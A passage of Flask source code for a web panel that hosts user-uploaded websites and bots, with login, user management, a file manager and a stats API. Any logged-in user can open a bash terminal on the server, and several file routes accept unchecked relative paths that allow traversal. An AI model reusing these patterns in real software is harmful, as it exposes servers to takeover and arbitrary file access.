                            start_bot_by_id(wid)
                        else:
                            start_website_process(wid)
                save_kill_state({"saved_bots": []})
                KILL_SWITCH_ACTIVE = False
    except: pass
    threading.Timer(1, _cache_invalidator).start()
_cache_invalidator()

# ---------- FLASK ROUTES ----------
@app.before_request
def check_expiry_and_session():
    if 'user_id' not in session: return
    user = get_user_by_id(session['user_id'])
    if not user:
        session.clear()
        return redirect('/')
    if is_expired(user):
        delete_user_account(user['username'])
        session.clear()
        return redirect('/')
    sess_version = session.get('session_version', 0)
    if user['session_version'] != sess_version:
        session.clear()
        return redirect('/')
    if KILL_SWITCH_ACTIVE and request.path.startswith('/api/'):
        return jsonify({'error': 'System paused'}), 503

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template_string(REGISTER_TEMPLATE)
    username = request.form.get('username', '').strip()
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    if not username or not email or not password:
        return render_template_string(REGISTER_TEMPLATE, error='All fields required')
    if get_user_by_username(username):
        return render_template_string(REGISTER_TEMPLATE, error='Username taken')
    with get_db() as conn:
        try:
            conn.execute('INSERT INTO users (username, email, password_hash, role, plan) VALUES (?, ?, ?, ?, ?)',
                         (username, email, generate_password_hash(password), 'owner', 'free'))
            conn.commit()
        except:
            return render_template_string(REGISTER_TEMPLATE, error='Email or username exists')
    return redirect(url_for('index'))

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    if not username or not password:
        return render_template_string(LOGIN_TEMPLATE, error='Please fill all fields')
    user = get_user_by_username(username)
    if not user or not check_password_hash(user['password_hash'], password):
        return render_template_string(LOGIN_TEMPLATE, error='Invalid credentials')
    if user['status'] != 'active':
        return render_template_string(LOGIN_TEMPLATE, error='Account disabled')
    session['user_id'] = user['id']
    session['username'] = user['username']
    session['role'] = user['role']
    session['plan'] = user['plan']
    session['session_version'] = user['session_version']
    with get_db() as conn:
        conn.execute('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?', (user['id'],))
        conn.commit()
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# ---------- DASHBOARD ----------
@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    user_id = session['user_id']
    websites = get_websites_by_user(user_id, 'website')
    bots = get_websites_by_user(user_id, 'bot')
    base_url = os.environ.get('BASE_URL', request.host_url.rstrip('/'))
    user = get_user_by_id(user_id)
    return render_template_string(DASHBOARD_TEMPLATE,
                                  user=session['username'],
                                  websites=websites,
                                  bots=bots,
                                  role=session.get('role', 'owner'),
                                  plan=session.get('plan', 'free'),
                                  base_url=base_url,
                                  user_obj=user)

# ---------- UPLOAD (Unified) ----------
@app.route('/upload', methods=['POST'])
def upload():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    user_id = session['user_id']
    if 'files[]' not in request.files:
        return jsonify({'success': False, 'error': 'No files'}), 400
    files = request.files.getlist('files[]')
    if not files or all(f.filename == '' for f in files):
        return jsonify({'success': False, 'error': 'No file selected'}), 400
    
    upload_type = request.form.get('type', 'website')
    user = get_user_by_id(user_id)
    
    with get_db() as conn:
        count = conn.execute('SELECT COUNT(*) FROM websites WHERE owner_id = ? AND type = ?', (user_id, upload_type)).fetchone()[0]
    slug = generate_website_slug(session['username'], count)
    if get_website_by_slug(slug):
        count += 1
        slug = generate_website_slug(session['username'], count)
    
    with get_db() as conn:
        cur = conn.execute('''INSERT INTO websites (owner_id, website_slug, website_folder, status, type, deployment_type)
                              VALUES (?, ?, ?, ?, ?, ?)''',
                           (user_id, slug, f"website_{0}", 'uploaded', upload_type, 'zip'))
        website_id = cur.lastrowid
        conn.commit()
    
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    os.makedirs(folder, exist_ok=True)
    
    zip_file = None
    for f in files:
        if f.filename.lower().endswith('.zip'):
            zip_file = f
        else:
            filename = secure_filename(f.filename)
            f.save(os.path.join(folder, filename))
    if zip_file:
        zip_file.save(os.path.join(folder, 'upload.zip'))
    
    def bg_deploy():
        deploy_zip(website_id)
    thread = threading.Thread(target=bg_deploy)
    thread.daemon = True
    thread.start()
    
    return jsonify({'success': True, 'website_id': website_id, 'slug': slug})

# ---------- API ROUTES (Websites/Bots) ----------
@app.route('/api/website/<int:website_id>/start', methods=['POST'])
def api_start_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    if w['type'] == 'bot':
        ok, err = start_bot_by_id(website_id)
        msg = err
    else:
        ok, msg = start_website_process(website_id)
    if ok: return jsonify({'success': True, 'message': msg})
    return jsonify({'success': False, 'error': msg}), 500

@app.route('/api/website/<int:website_id>/stop', methods=['POST'])
def api_stop_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    if w['type'] == 'bot':
        ok, err = stop_bot_by_id(website_id)
        msg = err
    else:
        ok, msg = stop_website_process(website_id)
    if ok: return jsonify({'success': True, 'message': msg})
    return jsonify({'success': False, 'error': msg}), 500

@app.route('/api/website/<int:website_id>/restart', methods=['POST'])
def api_restart_website(website_id):
    api_stop_website(website_id)
    time.sleep(1)
    return api_start_website(website_id)

@app.route('/api/website/<int:website_id>/delete', methods=['POST'])
def api_delete_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    if w['status'] == 'running':
        if w['type'] == 'bot': stop_bot_by_id(website_id)
        else: stop_website_process(website_id)
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    shutil.rmtree(folder, ignore_errors=True)
    with get_db() as conn:
        conn.execute('DELETE FROM websites WHERE id = ?', (website_id,))
        conn.execute('DELETE FROM logs WHERE website_id = ?', (website_id,))
        conn.execute('DELETE FROM deployments WHERE website_id = ?', (website_id,))
        conn.commit()
    return jsonify({'success': True})

@app.route('/api/website/<int:website_id>/rename', methods=['POST'])
def api_rename_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    new_name = request.form.get('name', '').strip()
    if not new_name: return jsonify({'error': 'Name required'}), 400
    with get_db() as conn:
        conn.execute('UPDATE websites SET website_name = ? WHERE id = ?', (new_name, website_id))
        conn.commit()
    return jsonify({'success': True, 'new_name': new_name})

@app.route('/api/website/<int:website_id>/logs', methods=['GET'])
def api_get_logs(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log") if w['type'] == 'website' else os.path.join(LOG_FOLDER, f"bot_{website_id}.log")
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            lines = f.readlines()
        return jsonify({'logs': ''.join(lines[-100:])})
    return jsonify({'logs': ''})

@app.route('/api/website/<int:website_id>/content', methods=['GET'])
def api_get_content(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    filepath = os.path.join(folder, w['startup_file'] or 'app.py')
    if not os.path.exists(filepath):
        for f in os.listdir(folder):
            if get_interpreter(f):
                filepath = os.path.join(folder, f)
                break
    if not os.path.exists(filepath): return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    return jsonify({'content': content})

@app.route('/api/website/<int:website_id>/content', methods=['PUT'])
def api_update_content(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    data = request.json
    new_content = data.get('content', '')
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    filepath = os.path.join(folder, w['startup_file'] or 'app.py')
    if not os.path.exists(filepath):
        for f in os.listdir(folder):
            if get_interpreter(f):
                filepath = os.path.join(folder, f)
                break
    if not os.path.exists(filepath): return jsonify({'error': 'File not found'}), 404
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    if w['status'] == 'running':
        if w['type'] == 'bot': stop_bot_by_id(website_id); start_bot_by_id(website_id)
        else: stop_website_process(website_id); start_website_process(website_id)
    return jsonify({'success': True})

@app.route('/api/website/<int:website_id>/download', methods=['GET'])
def api_download_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.exists(folder):
            for root, _, files_in_folder in os.walk(folder):
                for fname in files_in_folder:
                    full_path = os.path.join(root, fname)
                    arcname = os.path.relpath(full_path, folder)
                    zipf.write(full_path, arcname)
    zip_buffer.seek(0)
    return send_file(zip_buffer, as_attachment=True, download_name=f"{w['website_slug']}_project.zip")

# ---------- USER MANAGEMENT API (from app.py) ----------
@app.route('/api/users', methods=['GET'])
def api_get_users():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    with get_db() as conn:
        users = conn.execute('SELECT id, username, email, role, plan, status, created_at, expires_at FROM users').fetchall()
    return jsonify([dict(u) for u in users])

@app.route('/api/users', methods=['POST'])
def api_create_user():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    data = request.json
    username = data.get('username', '').strip()
    password = data.get('password', '')
    role = data.get('role', 'user')
    expiry = data.get('expiry', '')
    if not username or not password: return jsonify({'error': 'Username and password required'}), 400
    if get_user_by_username(username): return jsonify({'error': 'User exists'}), 400
    with get_db() as conn:
        try:
            conn.execute('INSERT INTO users (username, email, password_hash, role, plan, expires_at) VALUES (?, ?, ?, ?, ?, ?)',
                         (username, username+'@hosting.local', generate_password_hash(password), role, 'free', parse_expiry(expiry)))
            conn.commit()
        except:
            return jsonify({'error': 'Failed to create'}), 500
    return jsonify({'success': True})

@app.route('/api/users/<username>', methods=['PUT'])
def api_update_user(username):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    user = get_user_by_username(username)
    if not user: return jsonify({'error': 'Not found'}), 404
    data = request.json
    with get_db() as conn:
        if 'password' in data:
            conn.execute('UPDATE users SET password_hash = ?, session_version = session_version + 1 WHERE username = ?',
                         (generate_password_hash(data['password']), username))
        if 'limit' in data:
            pass # we don't have limit in users table, we use plan
        if 'banned' in data:
            conn.execute('UPDATE users SET status = ? WHERE username = ?', ('banned' if data['banned'] else 'active', username))
        if 'expiry' in data:
            conn.execute('UPDATE users SET expires_at = ? WHERE username = ?', (parse_expiry(data['expiry']), username))
        conn.commit()
    return jsonify({'success': True})

@app.route('/api/users/<username>', methods=['DELETE'])
def api_delete_user(username):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    if username == session['username']: return jsonify({'error': 'Cannot delete self'}), 400
    delete_user_account(username)
    return jsonify({'success': True})

# ---------- PROXY ROUTE (WEBSITES) ----------
@app.route('/<slug>/', defaults={'path': ''})
@app.route('/<slug>/<path:path>')
def proxy_website(slug, path):
    website = get_website_by_slug(slug)
    if not website or website['type'] != 'website':
        return render_template_string(ERROR_TEMPLATE, message="Website not found", slug=slug), 404
    if website['status'] != 'running':
        return render_template_string(ERROR_TEMPLATE, message="Website is not running", slug=slug), 503
    port = website['allocated_port']
    if not port: return "Port not allocated", 500
    target_url = f"http://localhost:{port}/{path}"
    headers = {k: v for k, v in request.headers if k.lower() != 'host'}
    try:
        resp = requests.request(method=request.method, url=target_url, headers=headers, data=request.get_data(), cookies=request.cookies, stream=True, timeout=30)
        return Response(stream_with_context(resp.iter_content(chunk_size=8192)), status=resp.status_code, headers=resp.headers.items())
    except requests.exceptions.ConnectionError:
        update_website_status(website['id'], 'crashed')
        return render_template_string(ERROR_TEMPLATE, message="Website crashed. Please restart.", slug=slug), 503
    except Exception as e:
        return f"Proxy error: {str(e)}", 500

# ---------- STATS API (OWNER) ----------
@app.route('/api/stats')
def api_stats():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    user = get_user_by_id(session['user_id'])
    if user['role'] != 'admin': return jsonify({'error': 'Forbidden'}), 403

    # Main uptime
    main_uptime_seconds = int(time.time() - MAIN_START_TIME) if MAIN_START_TIME else 0

    # Internal websites/bots runtime
    with get_db() as conn:
        rows = conn.execute('SELECT id, total_runtime_seconds, last_start_time, status, type FROM websites').fetchall()
    total_internal_seconds = 0
    for row in rows:
        total_internal_seconds += row['total_runtime_seconds'] or 0
        if row['status'] == 'running' and row['last_start_time']:
            try:
                start_dt = datetime.fromisoformat(row['last_start_time'].replace(' ', 'T'))
                elapsed = int((datetime.now() - start_dt).total_seconds())
                total_internal_seconds += elapsed
            except: pass

    # Render API External Services
    render_services = []
    active_render_services = 0
    render_running_hours = 0
    if RENDER_API_KEY:
        services = get_all_services()
        if services:
            now = datetime.now()
            for svc in services:
                status = svc.get('status', 'unknown')
                if status == 'available':
                    active_render_services += 1
                    last_deploy = svc.get('lastDeployedAt') or svc.get('createdAt')
                    if last_deploy:
                        try:
                            dt = datetime.fromisoformat(last_deploy.replace('Z', '+00:00'))
                            render_running_hours += (now - dt).total_seconds() / 3600.0
                        except: pass
                render_services.append({
                    'name': svc.get('name', 'Unnamed'),
                    'type': svc.get('type', 'web'),
                    'status': status,
                })

    offset_hours = float(get_config('total_hours_offset', '0'))
    internal_hours = total_internal_seconds / 3600.0
    main_hours = main_uptime_seconds / 3600.0
    
    total_hours = offset_hours + main_hours + internal_hours + render_running_hours

    # Storage
    upload_size_bytes = calculate_folder_size(UPLOAD_FOLDER)
    upload_size_gb = upload_size_bytes / (1024**3)

    # Disk
    try:
        disk_usage = shutil.disk_usage('/')
        disk_total_gb = disk_usage.total / (1024**3)
        disk_free_gb = disk_usage.free / (1024**3)
    except:
        disk_total_gb = disk_free_gb = 0

    # Real RAM/CPU
    used_mb, total_mb, ram_percent = get_container_memory()
    if PSUTIL_AVAILABLE:
        cpu_percent = psutil.cpu_percent(interval=0.5)
    else:
        cpu_percent = 'N/A'

    return jsonify({
        'main_hours': round(main_hours, 2),
        'internal_hours': round(internal_hours, 2),
        'render_running_hours': round(render_running_hours, 2),
        'offset_hours': round(offset_hours, 2),
        'total_hours': round(total_hours, 2),
        'websites_count': len(rows),
        'render_services_count': len(render_services),
        'render_active_count': active_render_services,
        'render_services': render_services,
        'storage_used_gb': round(upload_size_gb, 2),
        'disk_total_gb': round(disk_total_gb, 2),
        'disk_free_gb': round(disk_free_gb, 2),
        'ram': {
            'used_mb': used_mb,
            'total_mb': total_mb,
            'percent': ram_percent
        },
        'cpu_percent': cpu_percent
    })

@app.route('/api/set_offset', methods=['POST'])
def set_offset():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    user = get_user_by_id(session['user_id'])
    if user['role'] != 'admin': return jsonify({'error': 'Forbidden'}), 403
    data = request.json
    try:
        offset = float(data.get('offset', 0))
    except:
        return jsonify({'error': 'Invalid number'}), 400
    set_config('total_hours_offset', str(offset))
    return jsonify({'success': True, 'new_offset': offset})

# ---------- TERMINAL (from app.py) ----------
terminal_sessions = {}
class TerminalSession:
    def __init__(self):
        self.process = None
        self.output_queue = queue.Queue()
        self.read_thread = None
        self.running = False
        self.master = None
    def start(self):
        if self.process and self.process.poll() is None: return
        master, slave = pty.openpty()
        self.process = subprocess.Popen(['/bin/bash'] if os.name != 'nt' else ['cmd.exe'],
                                        stdin=slave, stdout=slave, stderr=slave,
                                        universal_newlines=False, bufsize=0,
                                        preexec_fn=os.setsid if os.name != 'nt' else None)
        os.close(slave)
        self.master = master
        self.running = True
        self.read_thread = threading.Thread(target=self._reader, daemon=True)
        self.read_thread.start()
    def _reader(self):
        while self.running and self.process.poll() is None:
            try:
                rlist, _, _ = select.select([self.master], [], [], 0.1)
                if rlist:
                    data = os.read(self.master, 4096)
                    if data: self.output_queue.put(data)
            except: break
    def write(self, data):
        if self.process and self.process.poll() is None:
            os.write(self.master, data.encode('utf-8') if isinstance(data, str) else data)
    def read_output(self):
        out = b''
        while not self.output_queue.empty():
            out += self.output_queue.get_nowait()
        return out.decode('utf-8', errors='replace')
    def is_running(self):
        return self.process and self.process.poll() is None
    def stop(self):
        self.running = False
        if self.process:
            try:
                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
            except: self.process.terminate()
            self.process.wait()
            self.process = None
        if self.master:
            try: os.close(self.master)
            except: pass
            self.master = None

def get_terminal_session(username):
    if username not in terminal_sessions:
        sess = TerminalSession()
        sess.start()
        terminal_sessions[username] = sess
    return terminal_sessions[username]

@app.route('/api/terminal/start', methods=['POST'])
def terminal_start():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    sess = get_terminal_session(session['username'])
    if not sess.is_running(): sess.start()
    return jsonify({'success': True})

@app.route('/api/terminal/send', methods=['POST'])
def terminal_send():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    input_data = data.get('data', '')
    sess = terminal_sessions.get(session['username'])
    if not sess or not sess.is_running():
        return jsonify({'error': 'Terminal not running'}), 400
    sess.write(input_data + '\n')
    return jsonify({'success': True})

@app.route('/api/terminal/read', methods=['GET'])
def terminal_read():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    sess = terminal_sessions.get(session['username'])
    if not sess:
        return jsonify({'output': '', 'running': False})
    output = sess.read_output()
    running = sess.is_running()
    return jsonify({'output': output, 'running': running})

@app.route('/api/terminal/stop', methods=['POST'])
def terminal_stop():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    sess = terminal_sessions.get(session['username'])
    if sess:
        sess.stop()
        terminal_sessions.pop(session['username'], None)
    return jsonify({'success': True})

# ---------- FILE MANAGER (owner only) ----------
def safe_path(path):
    abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
    if not abs_path.startswith(BASE_DIR): return None
    return abs_path

@app.route('/api/files', methods=['GET'])
def list_files():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    path = request.args.get('path', '')
    abs_path = safe_path(path)
    if abs_path is None: return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path): return jsonify({'error': 'Path does not exist'}), 404
    if os.path.isfile(abs_path):
        return jsonify({
            'type': 'file',
            'name': os.path.basename(abs_path),
            'path': path,
            'size': os.path.getsize(abs_path),
            'modified': os.path.getmtime(abs_path)
        })
    items = []
    try:
        for entry in os.listdir(abs_path):
            full = os.path.join(abs_path, entry)
            rel = os.path.relpath(full, BASE_DIR)
            items.append({
                'name': entry,
                'path': rel,
                'type': 'directory' if os.path.isdir(full) else 'file',
                'size': os.path.getsize(full) if os.path.isfile(full) else 0,
                'modified': os.path.getmtime(full)
            })
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        return jsonify({'items': items, 'current_path': path})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/delete', methods=['POST'])
def delete_file():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    data = request.json
    path = data.get('path', '')
    abs_path = safe_path(path)
    if abs_path is None: return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path): return jsonify({'error': 'Path does not exist'}), 404
    try:
        if os.path.isdir(abs_path): shutil.rmtree(abs_path)
        else: os.remove(abs_path)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/rename', methods=['POST'])
def rename_file():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    data = request.json
    old_path = data.get('old_path', '')
    new_name = data.get('new_name', '').strip()
    if not new_name: return jsonify({'error': 'New name required'}), 400
    abs_old = safe_path(old_path)
    if abs_old is None: return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_old): return jsonify({'error': 'Path does not exist'}), 404
    new_abs = os.path.join(os.path.dirname(abs_old), new_name)
    if os.path.exists(new_abs): return jsonify({'error': 'Name already exists'}), 400
    try:
        os.rename(abs_old, new_abs)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download', methods=['GET'])
def download_file():
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    if session.get('role') != 'admin': return jsonify({'error': 'Forbidden'}), 403
    path = request.args.get('path', '')
    abs_path = safe_path(path)
    if abs_path is None: return jsonify({'error': 'Invalid path'}), 400
    if not os.path.exists(abs_path) or os.path.isdir(abs_path):
        return jsonify({'error': 'File not found'}), 404
    return send_file(abs_path, as_attachment=True)

# ---------- BUILD LOGS SSE ----------
@app.route('/deploy/<int:website_id>/logs')
def deploy_logs_sse(website_id):
    if 'user_id' not in session: return "Unauthorized", 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: abort(404)
    with get_db() as conn:
        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
    if not dep: return "No deployment", 404
    log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
    def generate():
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                for line in f:
                    yield f"data: {line.strip()}\n\n"
        last_size = os.path.getsize(log_file) if os.path.exists(log_file) else 0
        while True:
            time.sleep(0.5)
            if os.path.exists(log_file):
                cur = os.path.getsize(log_file)
                if cur > last_size:
                    with open(log_file, 'r') as f:
                        f.seek(last_size)
                        for line in f:
                            yield f"data: {line.strip()}\n\n"
                    last_size = cur
            with get_db() as conn:
                status = conn.execute('SELECT status FROM deployments WHERE id = ?', (dep['id'],)).fetchone()
            if status and status['status'] in ('success', 'failed'):
                yield f"data: [REFRESH]\n\n"
                yield f"data: [SYSTEM] Completed with status: {status['status']}\n\n"
                break
    return Response(stream_with_context(generate()), mimetype='text/event-stream')

# ---------- WEBSITE FILES VIEWER (simplified) ----------
@app.route('/website/<int:website_id>/files')
def files(website_id):
    if 'user_id' not in session: return redirect(url_for('index'))
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: abort(404)
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    if not os.path.exists(folder): abort(404)
    items = []
    for root, dirs, files_list in os.walk(folder):
        rel = os.path.relpath(root, folder)
        if rel == '.': rel = ''
        for f in files_list:
            full = os.path.join(root, f)
            items.append({'name': f, 'path': os.path.join(rel, f).replace('\\', '/'), 'is_dir': False, 'size': os.path.getsize(full)})
        for d in dirs:
            items.append({'name': d, 'path': os.path.join(rel, d).replace('\\', '/'), 'is_dir': True})
    return render_template_string(FILES_TEMPLATE, website=w, items=items)

@app.route('/website/<int:website_id>/edit', methods=['GET', 'POST'])
def edit_file(website_id):
    if 'user_id' not in session: return redirect(url_for('index'))
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: abort(404)
    file_path = request.args.get('path', '').strip()
    if not file_path: return "No path", 400
    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", file_path)
    if not os.path.exists(full) or not os.path.isfile(full): abort(404)
    if request.method == 'GET':
        with open(full, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return render_template_string(EDIT_TEMPLATE, website=w, file_path=file_path, content=content)
    else:
        with open(full, 'w', encoding='utf-8') as f:
            f.write(request.form.get('content', ''))
        return redirect(url_for('files', website_id=website_id))

@app.route('/website/<int:website_id>/file/upload', methods=['POST'])
def upload_file_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    if 'file' not in request.files: return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '': return jsonify({'error': 'Empty'}), 400
    rel_path = request.form.get('path', '')
    folder = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", rel_path)
    os.makedirs(folder, exist_ok=True)
    filename = secure_filename(file.filename)
    file.save(os.path.join(folder, filename))
    return jsonify({'success': True})

@app.route('/website/<int:website_id>/file/delete', methods=['POST'])
def delete_file_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    path = request.json.get('path', '').strip()
    if not path: return jsonify({'error': 'Path required'}), 400
    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
    if not os.path.exists(full): return jsonify({'error': 'Not found'}), 404
    if os.path.isdir(full): shutil.rmtree(full)
    else: os.remove(full)
    return jsonify({'success': True})

@app.route('/website/<int:website_id>/file/rename', methods=['POST'])
def rename_file_website(website_id):
    if 'user_id' not in session: return jsonify({'error': 'Unauthorized'}), 401
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: return jsonify({'error': 'Not found'}), 404
    data = request.json
    old_path = data.get('old_path', '').strip()
    new_name = data.get('new_name', '').strip()
    if not old_path or not new_name: return jsonify({'error': 'Required'}), 400
    base = os.path.join(UPLOAD_FOLDER, f"website_{website_id}")
    old_full = os.path.join(base, old_path)
    if not os.path.exists(old_full): return jsonify({'error': 'Not found'}), 404
    new_full = os.path.join(os.path.dirname(old_full), new_name)
    if os.path.exists(new_full): return jsonify({'error': 'Already exists'}), 400
    os.rename(old_full, new_full)
    return jsonify({'success': True})

@app.route('/website/<int:website_id>/file/download', methods=['GET'])
def download_file_website(website_id):
    if 'user_id' not in session: return redirect(url_for('index'))
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: abort(404)
    path = request.args.get('path', '').strip()
    if not path: abort(400)
    full = os.path.join(UPLOAD_FOLDER, f"website_{website_id}", path)
    if not os.path.exists(full) or os.path.isdir(full): abort(404)
    return send_file(full, as_attachment=True)

@app.route('/website/<int:website_id>/build')
def build_logs_page(website_id):
    if 'user_id' not in session: return redirect(url_for('index'))
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: abort(404)
    with get_db() as conn:
        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
    return render_template_string(BUILD_LOGS_TEMPLATE, website=w, no_logs=not dep)

@app.route('/website/<int:website_id>/logs')
def view_logs(website_id):
    if 'user_id' not in session: return redirect(url_for('index'))
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: abort(404)
    with get_db() as conn:
        logs = conn.execute('SELECT * FROM logs WHERE website_id = ? ORDER BY timestamp DESC LIMIT 200', (website_id,)).fetchall()
    log_file = os.path.join(LOG_FOLDER, f"website_{website_id}.log") if w['type'] == 'website' else os.path.join(LOG_FOLDER, f"bot_{website_id}.log")
    file_log = ''
    if os.path.exists(log_file):
        with open(log_file, 'r', errors='ignore') as f:
            file_log = f.read()
    deploy_log = ''
    with get_db() as conn:
        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
    if dep:
        dep_log_file = dep['log_file'] or os.path.join(LOG_FOLDER, f"deploy_{dep['id']}.log")
        if os.path.exists(dep_log_file):
            with open(dep_log_file, 'r', errors='ignore') as f:
                deploy_log = f.read()
    error_logs = [log for log in logs if log['log_type'] == 'error']
    error_log_text = '\n'.join([f"{log['timestamp']} {log['log_text']}" for log in error_logs])
    return render_template_string(LOGS_TEMPLATE, website=w, logs=logs, file_log=file_log, deploy_log=deploy_log, error_log_text=error_log_text)

@app.route('/website/<int:website_id>/deployments')
def deployment_history(website_id):
    if 'user_id' not in session: return redirect(url_for('index'))
    w = get_website_by_id(website_id)
    if not w or w['owner_id'] != session['user_id']: abort(404)
    with get_db() as conn:
        deployments = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY started_at DESC', (website_id,)).fetchall()
    return render_template_string(DEPLOYMENTS_TEMPLATE, website=w, deployments=deployments)

# ---------- TEMPLATES ----------
ERROR_TEMPLATE = """<!DOCTYPE html>
<html><head><title>Error</title>
<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:rgba(255,255,255,0.05);padding:40px;border-radius:20px;text-align:center}h1{color:#ff4757}a{color:#00e5ff;text-decoration:none}</style>
